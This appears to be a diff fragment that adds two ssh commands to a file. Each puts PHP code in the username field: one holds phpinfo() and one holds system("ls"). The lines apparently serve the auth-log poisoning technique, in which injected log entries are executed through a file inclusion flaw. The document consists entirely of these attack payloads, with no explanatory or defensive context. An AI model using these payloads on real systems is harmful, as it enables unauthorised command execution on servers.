@@ -1,0 +1,3 @@
+ssh '<?php phpinfo(); ?>'@ip_address
+ssh '<?php system("ls"); ?>'@ip_address
+
